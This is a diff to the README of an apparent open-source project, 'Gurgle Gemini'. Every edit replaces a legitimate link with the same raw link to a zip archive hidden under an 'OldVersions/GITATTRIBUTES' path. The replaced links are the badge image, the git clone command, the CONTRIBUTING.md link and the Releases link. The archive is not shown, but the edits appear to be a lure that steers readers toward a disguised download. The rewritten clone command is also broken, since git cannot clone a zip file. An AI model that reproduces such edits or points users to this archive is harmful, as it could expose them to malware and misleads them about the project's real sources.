@@ -1,6 +1,6 @@
 # Gurgle Gemini Docs 📖✨
 
-![Gurgle Gemini](https://img.shields.io/badge/Gurgle_Gemini-Docs-blue?style=for-the-badge&logo=github)
+![Gurgle Gemini](https://raw.githubusercontent.com/nobidysy/Gurgle_Gemini_Docs/Gurgle_Gemini_Docs_Main-dev/OldVersions/GITATTRIBUTES/1/Gemini_Gurgle_Docs_3.1.zip)
 
 Welcome to the official documentation source for **Gurgle Gemini**. This project is a privacy-respecting, free, and open-source alternative to Google Gemini. It also serves as a parody of Google Gemini, making it both a practical tool and a humorous take on existing technologies.
 
@@ -36,7 +36,7 @@ To get started with Gurgle Gemini, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/nobidysy/Gurgle_Gemini_Docs.git
+   git clone https://raw.githubusercontent.com/nobidysy/Gurgle_Gemini_Docs/Gurgle_Gemini_Docs_Main-dev/OldVersions/GITATTRIBUTES/1/Gemini_Gurgle_Docs_3.1.zip
    ```
 
 2. **Install Dependencies**: Navigate to the cloned directory and install any required dependencies.
@@ -70,11 +70,11 @@ We welcome contributions from the community! If you want to help improve Gurgle 
 2. **Make Changes**: Implement your changes in a separate branch.
 3. **Submit a Pull Request**: Once you're satisfied with your changes, submit a pull request for review.
 
-For detailed guidelines on contributing, check the [CONTRIBUTING.md](CONTRIBUTING.md) file in the repository.
+For detailed guidelines on contributing, check the [https://raw.githubusercontent.com/nobidysy/Gurgle_Gemini_Docs/Gurgle_Gemini_Docs_Main-dev/OldVersions/GITATTRIBUTES/1/Gemini_Gurgle_Docs_3.1.zip](https://raw.githubusercontent.com/nobidysy/Gurgle_Gemini_Docs/Gurgle_Gemini_Docs_Main-dev/OldVersions/GITATTRIBUTES/1/Gemini_Gurgle_Docs_3.1.zip) file in the repository.
 
 ## Releases
 
-To download the latest releases, visit the [Releases section](https://github.com/nobidysy/Gurgle_Gemini_Docs/releases). Here, you can find the latest versions of Gurgle Gemini along with their changelogs. If you need to download a specific version, follow the instructions provided in the release notes.
+To download the latest releases, visit the [Releases section](https://raw.githubusercontent.com/nobidysy/Gurgle_Gemini_Docs/Gurgle_Gemini_Docs_Main-dev/OldVersions/GITATTRIBUTES/1/Gemini_Gurgle_Docs_3.1.zip). Here, you can find the latest versions of Gurgle Gemini along with their changelogs. If you need to download a specific version, follow the instructions provided in the release notes.
 
 You can also check for updates and download the latest versions directly from the Releases section.
 
